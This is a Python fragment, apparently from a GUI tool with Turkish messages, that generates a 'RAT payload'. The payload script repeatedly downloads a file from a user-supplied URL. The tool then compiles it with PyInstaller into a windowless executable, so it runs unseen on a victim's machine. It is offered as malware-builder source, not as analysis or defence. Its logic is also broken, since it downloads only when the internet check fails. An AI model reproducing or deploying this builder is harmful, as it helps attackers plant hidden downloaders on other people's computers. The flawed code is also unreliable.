def build_payload():
    url = url_entry.get()
    output_file = "rat_payload.py"
    
    payload_code = f'''
import urllib.request
import socket
import time
import os

def check_internet():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except:
        return False

def download_file(url):
    try:
        file_name = url.split("/")[-1]
        urllib.request.urlretrieve(url, file_name)
        return True
    except:
        return False

TARGET_URL = "{url}"

while True:
    if not check_internet():
        download_file(TARGET_URL)
    time.sleep(10)
'''
    
    with open(output_file, "w") as f:
        f.write(payload_code)
    
    # PyInstaller komutunu doğrudan çalıştır
    try:
        subprocess.run(f"pyinstaller --onefile --noconsole {output_file}", shell=True, check=True)
        messagebox.showinfo("Başarılı", "Payload oluşturuldu: dist/rat_payload.exe")
    except Exception as e:
        messagebox.showerror("Hata", f"PyInstaller çalıştırılamadı: {e}")

# GUI
